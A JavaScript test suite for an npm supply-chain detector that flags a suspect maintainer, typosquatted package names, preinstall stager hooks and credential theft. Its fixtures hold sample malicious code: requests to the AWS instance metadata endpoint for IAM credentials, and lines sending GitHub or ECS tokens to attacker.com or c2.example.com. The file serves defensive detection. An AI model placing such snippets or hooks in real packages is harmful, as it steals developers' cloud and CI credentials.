import { test } from 'node:test';
import assert from 'assert/strict';
import { scan } from '../backend/detectors/typosquat-vpmdhaj/index.js';

test('TSQ: vpmdhaj maintainer detected triggers stop condition', async () => {
  const registryMeta = {
    versions: { '1.0.0': { _npmUser: { name: 'vpmdhaj' } } },
  };
  const pkgJson = { name: 'some-package', version: '1.0.0', scripts: { test: 'node test.js' } };
  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  assert.equal(findings[0].severity, 'critical');
  assert.ok(findings[0].stopCondition);
  const ev = JSON.parse(findings[0].evidence);
  assert.equal(ev.maintainer, 'vpmdhaj');
});

test('TSQ: vpmdhaj- prefix package triggers stop condition', async () => {
  const pkgJson = { name: 'vpmdhaj-opensearch-setup', version: '1.0.0', scripts: { test: 'node test.js' } };
  const findings = await scan(pkgJson, [], {}, null);
  assert.equal(findings.length, 1);
  assert.ok(findings[0].stopCondition);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.suspiciousAliases.includes('vpmdhaj-opensearch-setup'));
});

test('TSQ: typosquat opensearch-setup triggers D1 (non-block)', async () => {
  const pkgJson = { name: 'opensearch-setup', version: '1.0.0', scripts: { test: 'node test.js' } };
  const registryMeta = { versions: { '1.0.0': { _npmUser: { name: 'unknown-publisher' } } } };
  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D1'));
  assert.ok(ev.details.D1.suspiciousAliases.includes('opensearch-setup'));
});

test('TSQ: typosquat env-config-manager triggers D1', async () => {
  const pkgJson = { name: 'env-config-manager', version: '1.0.0', scripts: { test: 'node test.js' } };
  const registryMeta = { versions: { '1.0.0': { _npmUser: { name: 'unknown-publisher' } } } };
  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D1'));
});

test('TSQ: preinstall with setup.mjs triggers D2', async () => {
  const pkgJson = { name: 'suspicious-pkg', version: '1.0.0', scripts: { preinstall: 'node setup.mjs', test: 'node test.js' } };
  const findings = await scan(pkgJson, [], {}, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D2'));
  assert.equal(ev.details.D2.details[0].hookType, 'preinstall');
  assert.ok(ev.details.D2.details[0].hookCommand.includes('setup.mjs'));
});

test('TSQ: preinstall with stager.js triggers D2 (gen 2)', async () => {
  const pkgJson = { name: 'evil-pkg', version: '1.0.0', scripts: { preinstall: 'node stager.js', test: 'node test.js' } };
  const findings = await scan(pkgJson, [], {}, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D2'));
  assert.equal(ev.details.D2.details[0].generation, 2);
});

test('TSQ: preinstall with bun run triggers D2', async () => {
  const pkgJson = { name: 'bun-pkg', version: '1.0.0', scripts: { preinstall: 'bun run stager.js', test: 'node test.js' } };
  const findings = await scan(pkgJson, [], {}, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D2'));
  assert.equal(ev.details.D2.details[0].runtimeAbuse, 'Bun as stealthy loader');
});

test('TSQ: AWS IMDSv2 credential access triggers D3', async () => {
  const files = [{ path: 'evil.js', content: `fetch('http://169.254.169.254/latest/api/token').then(r => fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/'));` }];
  const pkgJson = { name: 'cred-thief', version: '1.0.0' };
  const findings = await scan(pkgJson, files, {}, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D3'));
  assert.ok(ev.details.D3.targets.includes('AWS_IMDSv2'));
});

test('TSQ: ECS credential access triggers D3', async () => {
  const files = [{ path: 'env.js', content: `const token = process.env.AWS_CONTAINER_AUTHORIZATION_TOKEN; fetch(\`https://attacker.com/steal?t=\${token}\`);` }];
  const pkgJson = { name: 'ecs-thief', version: '1.0.0' };
  const findings = await scan(pkgJson, files, {}, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D3'));
  assert.ok(ev.details.D3.targets.includes('ECS_TASK_ROLE'));
  assert.ok(ev.details.D3.detectedEnvVars.includes('AWS_CONTAINER_AUTHORIZATION_TOKEN'));
});

test('TSQ: Vault credential access triggers D3', async () => {
  const files = [{ path: 'vault.js', content: `const addr = process.env.VAULT_ADDR; const token = process.env.VAULT_TOKEN; fetch(\`https://c2.example.com/\`);` }];
  const pkgJson = { name: 'vault-thief', version: '1.0.0' };
  const findings = await scan(pkgJson, files, {}, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D3'));
  assert.ok(ev.details.D3.targets.includes('VAULT_CREDENTIALS'));
});

test('TSQ: GitHub Actions token exfiltration triggers D3', async () => {
  const files = [{ path: 'ci.js', content: `const token = process.env.GITHUB_TOKEN; fetch('https://attacker.com/exfil?token=' + token);` }];
  const pkgJson = { name: 'ci-thief', version: '1.0.0' };
  const findings = await scan(pkgJson, files, {}, null);
  assert.equal(findings.length, 1);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev.triggeredChecks.includes('D3'));
  assert.ok(ev.details.D3.targets.includes('GITHUB_TOKEN'));
});

test('TSQ: multiple signals combine', async () => {
  const files = [{ path: 'evil.js', content: `const t = process.env.GITHUB_TOKEN; fetch('http://169.254.169.254/latest/api/token');` }];
  const pkgJson = { name: 'multi-threat', version: '1.0.0', scripts: { preinstall: 'node setup.mjs', test: 'node test.js' } };
  const registryMeta = { versions: { '1.0.0': { _npmUser: { name: 'vpmdhaj' } } } };
  const findings = await scan(pkgJson, files, registryMeta, null);
  assert.equal(findings.length, 1);
  assert.ok(findings[0].stopCondition);
});

test('TSQ: clean package with no signals = no findings', async () => {
  const pkgJson = { name: 'express', version: '4.18.2', scripts: { test: 'node test.js' } };
  const registryMeta = { versions: { '4.18.2': { _npmUser: { name: 'dougwilson' } } } };
  const findings = await scan(pkgJson, [], registryMeta, null);
  assert.equal(findings.length, 0);
});

test('TSQ: preinstall with postinstall only = no D2', async () => {
  const pkgJson = { name: 'clean-pkg', version: '1.0.0', scripts: { postinstall: 'node build.js', test: 'node test.js' } };
  const findings = await scan(pkgJson, [], {}, null);
  assert.equal(findings.length, 0);
});

test('TSQ: provenance metadata on stop condition', async () => {
  const registryMeta = { versions: { '1.0.0': { _npmUser: { name: 'vpmdhaj' } } } };
  const pkgJson = { name: 'evil-pkg', version: '1.0.0' };
  const findings = await scan(pkgJson, [], registryMeta, null);
  const ev = JSON.parse(findings[0].evidence);
  assert.ok(ev._provenance);
  assert.equal(ev._provenance.detection_rule.rule_id, 'TSQ-MAINT-001');
});
